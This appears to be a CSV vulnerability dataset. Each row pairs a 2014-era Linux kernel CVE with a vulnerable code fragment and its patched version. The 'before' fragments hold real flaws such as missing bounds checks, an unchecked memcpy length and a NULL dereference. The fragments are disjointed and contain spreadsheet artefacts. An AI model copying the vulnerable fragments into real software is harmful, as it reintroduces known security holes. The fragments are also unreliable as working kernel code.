dotraplinkage void do_double_fault(struct pt_regs *regs, long error_code)
{
 static const char str[] = ""double fault"";
 set_intr_gate(X86_TRAP_OLD_MF, coprocessor_segment_overrun);
 set_intr_gate(X86_TRAP_TS, invalid_TSS);
 set_intr_gate(X86_TRAP_NP, segment_not_present);
 set_intr_gate(X86_TRAP_SS, stack_segment);
 set_intr_gate(X86_TRAP_GP, general_protection);
 set_intr_gate(X86_TRAP_SPURIOUS, spurious_interrupt_bug);
 set_intr_gate(X86_TRAP_MF, coprocessor_error);
"
2014,Bypass ,CVE-2014-8989,,
2014,DoS Overflow +Priv ,CVE-2014-8884," 0x00, 0x00, 0x00, 0x00,
 0x00, 0x00 };




 memcpy(&b[4], cmd->msg, cmd->msg_len);

	state->config->send_command(fe, 0x72,
"," 0x00, 0x00, 0x00, 0x00,
 0x00, 0x00 };

 if (cmd->msg_len > sizeof(b) - 4)
 return -EINVAL;

 memcpy(&b[4], cmd->msg, cmd->msg_len);

	state->config->send_command(fe, 0x72,
"
2014,#NAME?,CVE-2014-8709,"	}

 /* adjust first fragment's length */
	skb->len = hdrlen + per_fragm;
 return 0;
}

","	}

 /* adjust first fragment's length */
 skb_trim(skb, hdrlen + per_fragm);
 return 0;
}

"
2014,DoS ,CVE-2014-8559,,
2014,DoS ,CVE-2014-8481,"	/* Decode and fetch the destination operand: register or memory. */
	rc = decode_operand(ctxt, &ctxt->dst, (ctxt->d >> DstShift) & OpMask);

done:
	if (ctxt->rip_relative)
		ctxt->memopp->addr.mem.ea += ctxt->_eip;


	return (rc != X86EMUL_CONTINUE) ? EMULATION_FAILED : EMULATION_OK;
}

","	/* Decode and fetch the destination operand: register or memory. */
	rc = decode_operand(ctxt, &ctxt->dst, (ctxt->d >> DstShift) & OpMask);


	if (ctxt->rip_relative)
		ctxt->memopp->addr.mem.ea += ctxt->_eip;

done:
	return (rc != X86EMUL_CONTINUE) ? EMULATION_FAILED : EMULATION_OK;
}

"
2014,DoS ,CVE-2014-8480,"};

static const struct gprefix pfx_0f_ae_7 = {
	I(0, em_clflush), N, N, N,
};

static const struct group_dual group15 = { {
	N, I(ImplicitOps | EmulateOnUD, em_syscall),
	II(ImplicitOps | Priv, em_clts, clts), N,
	DI(ImplicitOps | Priv, invd), DI(ImplicitOps | Priv, wbinvd), N, N,
	N, D(ImplicitOps | ModRM), N, N,
	/* 0x10 - 0x1F */
	N, N, N, N, N, N, N, N,
	D(ImplicitOps | ModRM), N, N, N, N, N, N, D(ImplicitOps | ModRM),

	/* 0x20 - 0x2F */
	DIP(ModRM | DstMem | Priv | Op3264 | NoMod, cr_read, check_cr_read),
	DIP(ModRM | DstMem | Priv | Op3264 | NoMod, dr_read, check_dr_read),
","};

static const struct gprefix pfx_0f_ae_7 = {
	I(SrcMem | ByteOp, em_clflush), N, N, N,
};

static const struct group_dual group15 = { {
	N, I(ImplicitOps | EmulateOnUD, em_syscall),
	II(ImplicitOps | Priv, em_clts, clts), N,
	DI(ImplicitOps | Priv, invd), DI(ImplicitOps | Priv, wbinvd), N, N,
	N, D(ImplicitOps | ModRM | SrcMem | NoAccess), N, N,
	/* 0x10 - 0x1F */
	N, N, N, N, N, N, N, N,
	D(ImplicitOps | ModRM | SrcMem | NoAccess),
	N, N, N, N, N, N, D(ImplicitOps | ModRM | SrcMem | NoAccess),
	/* 0x20 - 0x2F */
	DIP(ModRM | DstMem | Priv | Op3264 | NoMod, cr_read, check_cr_read),
	DIP(ModRM | DstMem | Priv | Op3264 | NoMod, dr_read, check_dr_read),
"
2014,DoS Overflow ,CVE-2014-8369," gfn_t base_gfn, unsigned long npages);

static pfn_t kvm_pin_pages(struct kvm_memory_slot *slot, gfn_t gfn,
 unsigned long size)
{
 gfn_t end_gfn;
 pfn_t pfn;

	pfn     = gfn_to_pfn_memslot(slot, gfn);
	end_gfn = gfn + (size >> PAGE_SHIFT);
	gfn    += 1;

 if (is_error_noslot_pfn(pfn))
		 * Pin all pages we are about to map in memory. This is
		 * important because we unmap and unpin in 4kb steps later.
 */
		pfn = kvm_pin_pages(slot, gfn, page_size);
 if (is_error_noslot_pfn(pfn)) {
			gfn += 1;
 continue;
 if (r) {
 printk(KERN_ERR ""kvm_iommu_map_address:""
 ""iommu failed to map pfn=%llx\n"", pfn);
 kvm_unpin_pages(kvm, pfn, page_size);
 goto unmap_pages;
		}

"," gfn_t base_gfn, unsigned long npages);

static pfn_t kvm_pin_pages(struct kvm_memory_slot *slot, gfn_t gfn,
 unsigned long npages)
{
 gfn_t end_gfn;
 pfn_t pfn;

	pfn     = gfn_to_pfn_memslot(slot, gfn);
	end_gfn = gfn + npages;
	gfn    += 1;

 if (is_error_noslot_pfn(pfn))
		 * Pin all pages we are about to map in memory. This is
		 * important because we unmap and unpin in 4kb steps later.
 */
		pfn = kvm_pin_pages(slot, gfn, page_size >> PAGE_SHIFT);
 if (is_error_noslot_pfn(pfn)) {
			gfn += 1;
 continue;
 if (r) {
 printk(KERN_ERR ""kvm_iommu_map_address:""
 ""iommu failed to map pfn=%llx\n"", pfn);
 kvm_unpin_pages(kvm, pfn, page_size >> PAGE_SHIFT);
 goto unmap_pages;
		}

"
2015,DoS ,CVE-2014-8173,"#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 barrier();
#endif
 if (pmd_none(pmdval))
 return 1;
 if (unlikely(pmd_bad(pmdval))) {
 if (!pmd_trans_huge(pmdval))
 pmd_clear_bad(pmd);
 return 1;
	}
 return 0;
","#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 barrier();
#endif
 if (pmd_none(pmdval) || pmd_trans_huge(pmdval))
 return 1;
 if (unlikely(pmd_bad(pmdval))) {
 pmd_clear_bad(pmd);

 return 1;
	}
 return 0;
"
2015,DoS ,CVE-2014-8172,"	.max_files = NR_FILE
};

DEFINE_STATIC_LGLOCK(files_lglock);

/* SLAB cache for file structures */
static struct kmem_cache *filp_cachep __read_mostly;

 return ERR_PTR(error);
	}

 INIT_LIST_HEAD(&f->f_u.fu_list);
 atomic_long_set(&f->f_count, 1);
 rwlock_init(&f->f_owner.lock);
 spin_lock_init(&f->f_lock);
 if (atomic_long_dec_and_test(&file->f_count)) {
 struct task_struct *task = current;

 file_sb_list_del(file);
 if (likely(!in_interrupt() && !(task->flags & PF_KTHREAD))) {
 init_task_work(&file->f_u.fu_rcuhead, ____fput);
 if (!task_work_add(task, &file->f_u.fu_rcuhead, true))
{
 if (atomic_long_dec_and_test(&file->f_count)) {
 struct task_struct *task = current;
 file_sb_list_del(file);
 BUG_ON(!(task->flags & PF_KTHREAD));
 __fput(file);
	}
{
 if (atomic_long_dec_and_test(&file->f_count)) {
 security_file_free(file);
 file_sb_list_del(file);
 file_free(file);
	}
}

static inline int file_list_cpu(struct file *file)
{
#ifdef CONFIG_SMP
 return file->f_sb_list_cpu;
#else
 return smp_processor_id();
#endif
}

/* helper for file_sb_list_add to reduce ifdefs */
static inline void __file_sb_list_add(struct file *file, struct super_block *sb)
{
 struct list_head *list;
#ifdef CONFIG_SMP
 int cpu;
	cpu = smp_processor_id();
	file->f_sb_list_cpu = cpu;
	list = per_cpu_ptr(sb->s_files, cpu);
#else
	list = &sb->s_files;
#endif
 list_add(&file->f_u.fu_list, list);
}

/**
 * file_sb_list_add - add a file to the sb's file list
 * @file: file to add
 * @sb: sb to add it to
 *
 * Use this function to associate a file with the superblock of the inode it
 * refers to.
 */
void file_sb_list_add(struct file *file, struct super_block *sb)
{
 if (likely(!(file->f_mode & FMODE_WRITE)))
 return;
 if (!S_ISREG(file_inode(file)->i_mode))
 return;
 lg_local_lock(&files_lglock);
 __file_sb_list_add(file, sb);
 lg_local_unlock(&files_lglock);
}

/**
 * file_sb_list_del - remove a file from the sb's file list
 * @file: file to remove
 * @sb: sb to remove it from
 *
 * Use this function to remove a file from its superblock.
 */
void file_sb_list_del(struct file *file)
{
 if (!list_empty(&file->f_u.fu_list)) {
 lg_local_lock_cpu(&files_lglock, file_list_cpu(file));
 list_del_init(&file->f_u.fu_list);
 lg_local_unlock_cpu(&files_lglock, file_list_cpu(file));
	}
}

#ifdef CONFIG_SMP

/*
 * These macros iterate all files on all CPUs for a given superblock.
 * files_lglock must be held globally.
 */
#define do_file_list_for_each_entry(__sb, __file)		\
{								\
 int i;							\
 for_each_possible_cpu(i) {				\
 struct list_head *list;				\
		list = per_cpu_ptr((__sb)->s_files, i);		\
 list_for_each_entry((__file), list, f_u.fu_list)

#define while_file_list_for_each_entry				\
	}							\
}

#else

#define do_file_list_for_each_entry(__sb, __file)		\
{								\
 struct list_head *list;					\
	list = &(sb)->s_files;					\
 list_for_each_entry((__file), list, f_u.fu_list)

#define while_file_list_for_each_entry				\
}

#endif

/**
 *	mark_files_ro - mark all files read-only
 *	@sb: superblock in question
 *
 *	All files are marked read-only.  We don't care about pending
 *	delete files so this should be used in 'force' mode only.
 */
void mark_files_ro(struct super_block *sb)
{
 struct file *f;

 lg_global_lock(&files_lglock);
 do_file_list_for_each_entry(sb, f) {
 if (!file_count(f))
 continue;
 if (!(f->f_mode & FMODE_WRITE))
 continue;
 spin_lock(&f->f_lock);
		f->f_mode &= ~FMODE_WRITE;
 spin_unlock(&f->f_lock);
 if (file_check_writeable(f) != 0)
 continue;
 __mnt_drop_write(f->f_path.mnt);
 file_release_write(f);
	} while_file_list_for_each_entry;
 lg_global_unlock(&files_lglock);
}

void __init files_init(unsigned long mempages)
{ 
 unsigned long n;
	n = (mempages * (PAGE_SIZE / 1024)) / 10;
	files_stat.max_files = max_t(unsigned long, n, NR_FILE);
 files_defer_init();
 lg_lock_init(&files_lglock, ""files_lglock"");
 percpu_counter_init(&nr_files, 0);
} 
/*
 * file_table.c
 */
extern void file_sb_list_add(struct file *f, struct super_block *sb);
extern void file_sb_list_del(struct file *f);
extern void mark_files_ro(struct super_block *);
extern struct file *get_empty_filp(void);

/*
	}

	f->f_mapping = inode->i_mapping;
 file_sb_list_add(f, inode->i_sb);

 if (unlikely(f->f_mode & FMODE_PATH)) {
		f->f_op = &empty_fops;

cleanup_all:
 fops_put(f->f_op);
 file_sb_list_del(f);
 if (f->f_mode & FMODE_WRITE) {
 put_write_access(inode);
 if (!special_file(inode->i_mode)) {
 int i;
 list_lru_destroy(&s->s_dentry_lru);
 list_lru_destroy(&s->s_inode_lru);
#ifdef CONFIG_SMP
 free_percpu(s->s_files);
#endif
 for (i = 0; i < SB_FREEZE_LEVELS; i++)
 percpu_counter_destroy(&s->s_writers.counter[i]);
 security_sb_free(s);
 if (security_sb_alloc(s))
 goto fail;

#ifdef CONFIG_SMP
	s->s_files = alloc_percpu(struct list_head);
 if (!s->s_files)
 goto fail;
 for_each_possible_cpu(i)
 INIT_LIST_HEAD(per_cpu_ptr(s->s_files, i));
#else
 INIT_LIST_HEAD(&s->s_files);
#endif
 for (i = 0; i < SB_FREEZE_LEVELS; i++) {
 if (percpu_counter_init(&s->s_writers.counter[i], 0) < 0)
 goto fail;
	   make sure there are no rw files opened */
 if (remount_ro) {
 if (force) {
 mark_files_ro(sb);

		} else {
			retval = sb_prepare_remount_readonly(sb);
 if (retval)
#define FILE_MNT_WRITE_RELEASED 2

struct file {
 /*
	 * fu_list becomes invalid after file_free is called and queued via
	 * fu_rcuhead for RCU freeing
 */
 union {
 struct list_head	fu_list;
 struct llist_node	fu_llist;
 struct rcu_head 	fu_rcuhead;
	} f_u;
	 * Must not be taken from IRQ context.
 */
 spinlock_t		f_lock;
#ifdef CONFIG_SMP
 int			f_sb_list_cpu;
#endif
 atomic_long_t		f_count;
 unsigned int 		f_flags;
 fmode_t			f_mode;

 struct list_head	s_inodes;	/* all inodes */
 struct hlist_bl_head	s_anon;		/* anonymous dentries for (nfs) exporting */
#ifdef CONFIG_SMP
 struct list_head __percpu *s_files;
#else
 struct list_head	s_files;
#endif
 struct list_head	s_mounts;	/* list of mounts; _not_ for fs use */
 struct block_device	*s_bdev;
 struct backing_dev_info *s_bdi;
","	.max_files = NR_FILE
};



/* SLAB cache for file structures */
static struct kmem_cache *filp_cachep __read_mostly;

 return ERR_PTR(error);
	}


 atomic_long_set(&f->f_count, 1);
 rwlock_init(&f->f_owner.lock);
 spin_lock_init(&f->f_lock);
 if (atomic_long_dec_and_test(&file->f_count)) {
 struct task_struct *task = current;


 if (likely(!in_interrupt() && !(task->flags & PF_KTHREAD))) {
 init_task_work(&file->f_u.fu_rcuhead, ____fput);
 if (!task_work_add(task, &file->f_u.fu_rcuhead, true))
{
 if (atomic_long_dec_and_test(&file->f_count)) {
 struct task_struct *task = current;

 BUG_ON(!(task->flags & PF_KTHREAD));
 __fput(file);
	}
{
 if (atomic_long_dec_and_test(&file->f_count)) {
 security_file_free(file);

 file_free(file);
	}
}























































































































void __init files_init(unsigned long mempages)
{ 
 unsigned long n;
	n = (mempages * (PAGE_SIZE / 1024)) / 10;
	files_stat.max_files = max_t(unsigned long, n, NR_FILE);
 files_defer_init();

 percpu_counter_init(&nr_files, 0);
} 
/*
 * file_table.c
 */



extern struct file *get_empty_filp(void);

/*
	}

	f->f_mapping = inode->i_mapping;


 if (unlikely(f->f_mode & FMODE_PATH)) {
		f->f_op = &empty_fops;

cleanup_all:
 fops_put(f->f_op);

 if (f->f_mode & FMODE_WRITE) {
 put_write_access(inode);
 if (!special_file(inode->i_mode)) {
 int i;
 list_lru_destroy(&s->s_dentry_lru);
 list_lru_destroy(&s->s_inode_lru);



 for (i = 0; i < SB_FREEZE_LEVELS; i++)
 percpu_counter_destroy(&s->s_writers.counter[i]);
 security_sb_free(s);
 if (security_sb_alloc(s))
 goto fail;










 for (i = 0; i < SB_FREEZE_LEVELS; i++) {
 if (percpu_counter_init(&s->s_writers.counter[i], 0) < 0)
 goto fail;
	   make sure there are no rw files opened */
 if (remount_ro) {
 if (force) {
			sb->s_readonly_remount = 1;
 smp_wmb();
		} else {
			retval = sb_prepare_remount_readonly(sb);
 if (retval)
#define FILE_MNT_WRITE_RELEASED 2

struct file {




 union {

 struct llist_node	fu_llist;
 struct rcu_head 	fu_rcuhead;
	} f_u;
	 * Must not be taken from IRQ context.
 */
 spinlock_t		f_lock;



 atomic_long_t		f_count;
 unsigned int 		f_flags;
 fmode_t			f_mode;

 struct list_head	s_inodes;	/* all inodes */
 struct hlist_bl_head	s_anon;		/* anonymous dentries for (nfs) exporting */





 struct list_head	s_mounts;	/* list of mounts; _not_ for fs use */
 struct block_device	*s_bdev;
 struct backing_dev_info *s_bdi;
"
2018,DoS ,CVE-2014-8171,,
2015,Bypass ,CVE-2014-8160,"
static unsigned int nf_ct_generic_timeout __read_mostly = 600*HZ;

























static inline struct nf_generic_net *generic_pernet(struct net *net)
{
 return &net->ct.nf_ct_proto.generic;
static bool generic_new(struct nf_conn *ct, const struct sk_buff *skb,
 unsigned int dataoff, unsigned int *timeouts)
{
 return true;
}

#if IS_ENABLED(CONFIG_NF_CT_NETLINK_TIMEOUT)
","
static unsigned int nf_ct_generic_timeout __read_mostly = 600*HZ;

static bool nf_generic_should_process(u8 proto)
{
 switch (proto) {
#ifdef CONFIG_NF_CT_PROTO_SCTP_MODULE
 case IPPROTO_SCTP:
 return false;
#endif
#ifdef CONFIG_NF_CT_PROTO_DCCP_MODULE
 case IPPROTO_DCCP:
 return false;
#endif
#ifdef CONFIG_NF_CT_PROTO_GRE_MODULE
 case IPPROTO_GRE:
 return false;
#endif
#ifdef CONFIG_NF_CT_PROTO_UDPLITE_MODULE
 case IPPROTO_UDPLITE:
 return false;
#endif
 default:
 return true;
	}
}

static inline struct nf_generic_net *generic_pernet(struct net *net)
{
 return &net->ct.nf_ct_proto.generic;
static bool generic_new(struct nf_conn *ct, const struct sk_buff *skb,
 unsigned int dataoff, unsigned int *timeouts)
{
 return nf_generic_should_process(nf_ct_protonum(ct));
}

#if IS_ENABLED(CONFIG_NF_CT_NETLINK_TIMEOUT)
"
2014,Bypass ,CVE-2014-8134,,
2014,Bypass ,CVE-2014-8133," return -ESRCH;
}
















static void set_tls_desc(struct task_struct *p, int idx,
 const struct user_desc *info, int n)
{
 if (copy_from_user(&info, u_info, sizeof(info)))
 return -EFAULT;




 if (idx == -1)
		idx = info.entry_number;

{
 struct user_desc infobuf[GDT_ENTRY_TLS_ENTRIES];
 const struct user_desc *info;


 if (pos >= GDT_ENTRY_TLS_ENTRIES * sizeof(struct user_desc) ||
	    (pos % sizeof(struct user_desc)) != 0 ||
 else
		info = infobuf;





 set_tls_desc(target,
		     GDT_ENTRY_TLS_MIN + (pos / sizeof(struct user_desc)),
		     info, count / sizeof(struct user_desc));
"," return -ESRCH;
}

static bool tls_desc_okay(const struct user_desc *info)
{
 if (LDT_empty(info))
 return true;

 /*
	 * espfix is required for 16-bit data segments, but espfix
	 * only works for LDT segments.
 */
 if (!info->seg_32bit)
 return false;

 return true;
}

static void set_tls_desc(struct task_struct *p, int idx,
 const struct user_desc *info, int n)
{
 if (copy_from_user(&info, u_info, sizeof(info)))
 return -EFAULT;

 if (!tls_desc_okay(&info))
 return -EINVAL;

 if (idx == -1)
		idx = info.entry_number;

{
 struct user_desc infobuf[GDT_ENTRY_TLS_ENTRIES];
 const struct user_desc *info;
 int i;

 if (pos >= GDT_ENTRY_TLS_ENTRIES * sizeof(struct user_desc) ||
	    (pos % sizeof(struct user_desc)) != 0 ||
 else
		info = infobuf;

 for (i = 0; i < count / sizeof(struct user_desc); i++)
 if (!tls_desc_okay(info + i))
 return -EINVAL;

 set_tls_desc(target,
		     GDT_ENTRY_TLS_MIN + (pos / sizeof(struct user_desc)),
		     info, count / sizeof(struct user_desc));
"
2014,DoS ,CVE-2014-8086,,
2014,DoS ,CVE-2014-7975,,
2014,DoS ,CVE-2014-7970,,
2014,DoS ,CVE-2014-7843," sub	x1, x1, #2
4:	adds	x1, x1, #1
	b.mi	5f
 strb	wzr, [x0]
5: mov	x0, #0
 ret
ENDPROC(__clear_user)
"," sub	x1, x1, #2
4:	adds	x1, x1, #1
	b.mi	5f
USER(9f, strb	wzr, [x0]	)
5: mov	x0, #0
 ret
ENDPROC(__clear_user)
"
2014,DoS ,CVE-2014-7842,"
	++vcpu->stat.insn_emulation_fail;
 trace_kvm_emulate_insn_failed(vcpu);
 if (!is_guest_mode(vcpu)) {
		vcpu->run->exit_reason = KVM_EXIT_INTERNAL_ERROR;
		vcpu->run->internal.suberror = KVM_INTERNAL_ERROR_EMULATION;
		vcpu->run->internal.ndata = 0;
","
	++vcpu->stat.insn_emulation_fail;
 trace_kvm_emulate_insn_failed(vcpu);
 if (!is_guest_mode(vcpu) && kvm_x86_ops->get_cpl(vcpu) == 0) {
		vcpu->run->exit_reason = KVM_EXIT_INTERNAL_ERROR;
		vcpu->run->internal.suberror = KVM_INTERNAL_ERROR_EMULATION;
		vcpu->run->internal.ndata = 0;
"
2014,DoS ,CVE-2014-7841,"		addr_param = param.v + sizeof(sctp_addip_param_t);

		af = sctp_get_af_specific(param_type2af(param.p->type));



		af->from_addr_param(&addr, addr_param,
 htons(asoc->peer.port), 0);

","		addr_param = param.v + sizeof(sctp_addip_param_t);

		af = sctp_get_af_specific(param_type2af(param.p->type));
 if (af == NULL)
 break;

		af->from_addr_param(&addr, addr_param,
 htons(asoc->peer.port), 0);

"
2014,DoS +Priv ,CVE-2014-7826," int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE) */
 int syscall_nr;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE()) */
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;
 if (!test_bit(syscall_nr, enabled_perf_enter_syscalls))
 return;
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;
 if (!test_bit(syscall_nr, enabled_perf_exit_syscalls))
 return;
"," int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE) */
 int syscall_nr;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE()) */
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;
 if (!test_bit(syscall_nr, enabled_perf_enter_syscalls))
 return;
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;
 if (!test_bit(syscall_nr, enabled_perf_exit_syscalls))
 return;
"
2014,DoS Bypass ,CVE-2014-7825," int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE) */
 int syscall_nr;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE()) */
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;
 if (!test_bit(syscall_nr, enabled_perf_enter_syscalls))
 return;
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0)
 return;
 if (!test_bit(syscall_nr, enabled_perf_exit_syscalls))
 return;
"," int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE) */
 int syscall_nr;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;

 /* Here we're inside tp handler's rcu_read_lock_sched (__DO_TRACE()) */
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;
 if (!test_bit(syscall_nr, enabled_perf_enter_syscalls))
 return;
 int size;

	syscall_nr = trace_get_syscall_nr(current, regs);
 if (syscall_nr < 0 || syscall_nr >= NR_syscalls)
 return;
 if (!test_bit(syscall_nr, enabled_perf_exit_syscalls))
 return;
"
2015,DoS ,CVE-2014-7822,"	.compat_ioctl	= compat_blkdev_ioctl,
#endif
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
};

int ioctl_by_bdev(struct block_device *bdev, unsigned cmd, unsigned long arg)
	.fsync		= exofs_file_fsync,
	.flush		= exofs_flush,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
};

const struct inode_operations exofs_file_inode_operations = {
	.release	= ext2_release_file,
	.fsync		= ext2_fsync,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
};

#ifdef CONFIG_EXT2_FS_XIP
	.release	= ext3_release_file,
	.fsync		= ext3_sync_file,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
};

const struct inode_operations ext3_file_inode_operations = {
	.release	= ext4_release_file,
	.fsync		= ext4_sync_file,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
	.fallocate	= ext4_fallocate,
};

	.compat_ioctl	= f2fs_compat_ioctl,
#endif
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
};
	.lock		= gfs2_lock,
	.flock		= gfs2_flock,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
	.setlease	= gfs2_setlease,
	.fallocate	= gfs2_fallocate,
};
	.release	= gfs2_release,
	.fsync		= gfs2_fsync,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
	.setlease	= generic_setlease,
	.fallocate	= gfs2_fallocate,
};
	.write_iter	= generic_file_write_iter,
	.mmap		= generic_file_mmap,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
	.fsync		= jfs_fsync,
	.release	= jfs_release,
	.unlocked_ioctl = jfs_ioctl,
	.mmap		= generic_file_mmap,
	.fsync		= noop_fsync,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
	.llseek		= generic_file_llseek,
};

	.write_iter		= generic_file_write_iter,
	.fsync			= noop_fsync,
	.splice_read		= generic_file_splice_read,
	.splice_write		= generic_file_splice_write,
	.llseek			= generic_file_llseek,
};

	.read_iter = generic_file_read_iter,
	.write_iter = generic_file_write_iter,
	.splice_read = generic_file_splice_read,
	.splice_write = generic_file_splice_write,
	.llseek = generic_file_llseek,
};

#include <linux/gfp.h>
#include <linux/socket.h>
#include <linux/compat.h>

#include ""internal.h""

/*

EXPORT_SYMBOL(generic_file_splice_write);












































































































































static int write_pipe_buf(struct pipe_inode_info *pipe, struct pipe_buffer *buf,
 struct splice_desc *sd)
{
	.fsync          = ubifs_fsync,
	.unlocked_ioctl = ubifs_ioctl,
	.splice_read	= generic_file_splice_read,
	.splice_write	= generic_file_splice_write,
#ifdef CONFIG_COMPAT
	.compat_ioctl   = ubifs_compat_ioctl,
#endif
 return ret;
}

/*
 * xfs_file_splice_write() does not use xfs_rw_ilock() because
 * generic_file_splice_write() takes the i_mutex itself. This, in theory,
 * couuld cause lock inversions between the aio_write path and the splice path
 * if someone is doing concurrent splice(2) based writes and write(2) based
 * writes to the same inode. The only real way to fix this is to re-implement
 * the generic code here with correct locking orders.
 */
STATIC ssize_t
xfs_file_splice_write(
 struct pipe_inode_info	*pipe,
 struct file		*outfilp,
 loff_t			*ppos,
 size_t			count,
 unsigned int		flags)
{
 struct inode		*inode = outfilp->f_mapping->host;
 struct xfs_inode	*ip = XFS_I(inode);
 int			ioflags = 0;
 ssize_t			ret;

 XFS_STATS_INC(xs_write_calls);

 if (outfilp->f_mode & FMODE_NOCMTIME)
		ioflags |= IO_INVIS;

 if (XFS_FORCED_SHUTDOWN(ip->i_mount))
 return -EIO;

 xfs_ilock(ip, XFS_IOLOCK_EXCL);

 trace_xfs_file_splice_write(ip, count, *ppos, ioflags);

	ret = generic_file_splice_write(pipe, outfilp, ppos, count, flags);
 if (ret > 0)
 XFS_STATS_ADD(xs_write_bytes, ret);

 xfs_iunlock(ip, XFS_IOLOCK_EXCL);
 return ret;
}

/*
 * This routine is called to handle zeroing any space in the last block of the
 * file that is beyond the EOF.  We do this since the size is being increased
	.read_iter	= xfs_file_read_iter,
	.write_iter	= xfs_file_write_iter,
	.splice_read	= xfs_file_splice_read,
	.splice_write	= xfs_file_splice_write,
	.unlocked_ioctl	= xfs_file_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl	= xfs_file_compat_ioctl,
DEFINE_RW_EVENT(xfs_file_buffered_write);
DEFINE_RW_EVENT(xfs_file_direct_write);
DEFINE_RW_EVENT(xfs_file_splice_read);
DEFINE_RW_EVENT(xfs_file_splice_write);

DECLARE_EVENT_CLASS(xfs_page_class,
 TP_PROTO(struct inode *inode, struct page *page, unsigned long off,
 struct pipe_inode_info *, size_t, unsigned int);
extern ssize_t generic_file_splice_write(struct pipe_inode_info *,
 struct file *, loff_t *, size_t, unsigned int);


extern ssize_t generic_splice_sendpage(struct pipe_inode_info *pipe,
 struct file *out, loff_t *, size_t len, unsigned int flags);

","	.compat_ioctl	= compat_blkdev_ioctl,
#endif
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
};

int ioctl_by_bdev(struct block_device *bdev, unsigned cmd, unsigned long arg)
	.fsync		= exofs_file_fsync,
	.flush		= exofs_flush,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
};

const struct inode_operations exofs_file_inode_operations = {
	.release	= ext2_release_file,
	.fsync		= ext2_fsync,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
};

#ifdef CONFIG_EXT2_FS_XIP
	.release	= ext3_release_file,
	.fsync		= ext3_sync_file,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
};

const struct inode_operations ext3_file_inode_operations = {
	.release	= ext4_release_file,
	.fsync		= ext4_sync_file,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
	.fallocate	= ext4_fallocate,
};

	.compat_ioctl	= f2fs_compat_ioctl,
#endif
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
};
	.lock		= gfs2_lock,
	.flock		= gfs2_flock,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
	.setlease	= gfs2_setlease,
	.fallocate	= gfs2_fallocate,
};
	.release	= gfs2_release,
	.fsync		= gfs2_fsync,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
	.setlease	= generic_setlease,
	.fallocate	= gfs2_fallocate,
};
	.write_iter	= generic_file_write_iter,
	.mmap		= generic_file_mmap,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
	.fsync		= jfs_fsync,
	.release	= jfs_release,
	.unlocked_ioctl = jfs_ioctl,
	.mmap		= generic_file_mmap,
	.fsync		= noop_fsync,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
	.llseek		= generic_file_llseek,
};

	.write_iter		= generic_file_write_iter,
	.fsync			= noop_fsync,
	.splice_read		= generic_file_splice_read,
	.splice_write		= iter_file_splice_write,
	.llseek			= generic_file_llseek,
};

	.read_iter = generic_file_read_iter,
	.write_iter = generic_file_write_iter,
	.splice_read = generic_file_splice_read,
	.splice_write = iter_file_splice_write,
	.llseek = generic_file_llseek,
};

#include <linux/gfp.h>
#include <linux/socket.h>
#include <linux/compat.h>
#include <linux/aio.h>
#include ""internal.h""

/*

